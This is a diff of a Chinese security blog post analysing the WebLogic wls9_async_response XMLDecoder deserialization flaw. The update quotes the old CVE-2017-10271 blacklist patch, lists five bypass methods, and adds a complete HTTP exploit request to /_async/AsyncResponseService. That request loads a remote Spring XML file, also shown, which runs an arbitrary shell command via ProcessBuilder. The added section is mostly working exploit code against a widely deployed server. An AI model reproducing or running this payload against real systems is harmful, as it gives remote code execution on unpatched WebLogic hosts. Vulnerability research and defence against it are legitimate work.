@@ -136,7 +136,7 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/weblogic-wls9_async_response/4863214ca316d9efc1d7e4cca22bf481.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/weblogic-wls9_async_response/41ee6fa6f7a079d9ef6bb9798532e142.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/weblogic-wls9_async_response/aa92ac44ec47ced58876c5fcbef264cb.png">
-<meta property="og:updated_time" content="2019-04-25T06:07:13.594Z">
+<meta property="og:updated_time" content="2019-05-12T16:03:25.642Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Weblogic wls9_async_response 反序列化 ">
 <meta name="twitter:description" content="概述最近爆出了weblogic漏洞，有表哥在推特上发布了poc截图，不过对部分位置进行了模糊化处理，而那些位置正是漏洞触发的必要字符串。">
@@ -386,7 +386,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-25T13:22:12Z">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-25T21:22:12+08:00">
                 2019-04-25
               </time>
             
@@ -509,9 +509,22 @@
 <p><img src="/images/weblogic-wls9_async_response/aa92ac44ec47ced58876c5fcbef264cb.png" alt="aa92ac44ec47ced58876c5fcbef264cb.png"></p>
 <p>所以poc主体需要的格式基本如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</div><div class="line">                  xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</div><div class="line">                  xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</div><div class="line">    &lt;soapenv:Header&gt;</div><div class="line">        &lt;wsa:Action&gt;aa&lt;/wsa:Action&gt;</div><div class="line">        &lt;wsa:RelatesTo&gt;bb&lt;/wsa:RelatesTo&gt;</div><div class="line">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line"></div><div class="line">这里写 XmlDecode POC</div><div class="line"></div><div class="line">&lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">    &lt;soapenv:Body&gt;</div><div class="line">        &lt;asy:onAsyncDelivery/&gt;</div><div class="line">    &lt;/soapenv:Body&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本质上这个漏洞与<code>CVE-2017-10271</code>漏洞触发点相同，都是<code>WorkContextXmlInputAdapter.java</code> 里的<code>XmlDecoder</code>方法导致的，只是入口不一样而已。</p>
-<p>去年官方的补丁早已增加了黑名单的限制，<br>分别对 Object new method void进行了判断,进行了防护。目前网传的POC均为去年<code>CVE-2017-10271</code>,并非正真的绕过补丁的POC。</p>
-<p>故推测此次CNVD通报的漏洞POC并未真正放出。故需要持续跟进，等待真正的POC放出。</p>
+<h1 id="后续跟进"><a href="#后续跟进" class="headerlink" title="后续跟进"></a>后续跟进</h1><p>针对上面的PoC，官方的10271的补丁，补丁如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">private void validate(InputStream is) &#123;</div><div class="line">   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</div><div class="line">   try &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, new DefaultHandler() &#123;</div><div class="line">         private int overallarraylength = 0;</div><div class="line">         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</div><div class="line">            if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</div><div class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</div><div class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</div><div class="line">               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</div><div class="line">            &#125; else &#123;</div><div class="line">               if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</div><div class="line">                  for(int attClass = 0; attClass &amp;lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line">               if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</div><div class="line">                  String var9 = attributes.getValue(&quot;class&quot;);</div><div class="line">                  if(var9 != null &amp;amp;&amp;amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</div><div class="line">                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>本质上这个漏洞与<code>CVE-2017-10271</code>漏洞触发点相同，都是<code>WorkContextXmlInputAdapter.java</code> 里的<code>XmlDecoder</code>方法导致的，只是入口不一样而已。</p>
+<p>去年官方的补丁早已增加了黑名单的限制，<br>分别对 Object new method void进行了判断,进行了防护。</p>
+<p>根据大佬的说法，有多种绕过方式：</p>
+<ol>
+<li>UnitOfWorkChangeSet二次反序列化通过7u21 gadget触发rce</li>
+<li>UnitOfWorkChangeSet二次反序列化通过JtaTransactionManager实现jndi注入</li>
+<li>JdbcRowSetImpl实现jndi注入(需要绕过<void property="xxx">)</void></li>
+<li>EventData这个类构造函数，二次xmldecoder导致RCE</li>
+<li>FileSystemXmlApplicationContext spel表达式注入这个类实现RCE</li>
+</ol>
+<p>其中exp影响也是递增的：<br>第一个Poc只能用于10.3.6版本（服务器环境必须是7u21）。<br>第二个poc能用于10.3.6，(jdk版本在1.8版本以下)。<br>第三个poc只能用于12.1.3,(jdk 1.7及以上)<br>第四个poc只能用于12.1.3，不用外连服务器(jdk不受限制)。<br>第五个poc则可通杀10.3.6和12.1.3版本（jdk版本不受限制）</p>
+<p>最后一个通杀POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /_async/AsyncResponseService HTTP/1.1</div><div class="line">Host: 192.168.111.191:7001</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</div><div class="line">Accept: */*</div><div class="line">Content-Type: text/xml</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: ADMINCONSOLESESSION=bMbpcCdTfs7Lq0LtZxQyzxhc2YQH24MZvgLJx2yplWbdFjh0Ddy1!530003204</div><div class="line">Connection: close</div><div class="line">Content-Length: 661</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;</div><div class="line">&lt;void&gt;&lt;string&gt;远程XML文件&lt;/string&gt;&lt;/void&gt;</div><div class="line">&lt;/class&gt;&lt;/java&gt;</div><div class="line">&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</div><div class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</div><div class="line">            &lt;constructor-arg &gt;</div><div class="line">            &lt;list&gt;</div><div class="line">                &lt;value&gt;sh&lt;/value&gt;</div><div class="line">                &lt;value&gt;-c&lt;/value&gt;</div><div class="line">                &lt;value&gt;&lt;![CDATA[</div><div class="line">                执行的命令</div><div class="line">                ]]&gt;&lt;/value&gt;</div><div class="line">            &lt;/list&gt;</div><div class="line">            &lt;/constructor-arg&gt;</div><div class="line">        &lt;/bean&gt;</div><div class="line"> &lt;/beans&gt;</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -555,6 +568,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/21/RSSHUB-Feedly-IFTTT/" rel="prev" title="利用RSSHUB+Feedly+IFTTT获取安全资讯">
+                利用RSSHUB+Feedly+IFTTT获取安全资讯 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -633,7 +650,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/ || archive">
-                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -644,7 +661,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">19</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -655,7 +672,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">66</span>
+                <span class="site-state-item-count">67</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -708,7 +725,7 @@
               
 
               
-                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#远程调试"><span class="nav-number">2.</span> <span class="nav-text">远程调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#远程调试"><span class="nav-number">2.</span> <span class="nav-text">远程调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后续跟进"><span class="nav-number">4.</span> <span class="nav-text">后续跟进</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过"><span class="nav-number">5.</span> <span class="nav-text">绕过</span></a></li></ol></div>
               
 
             </div>
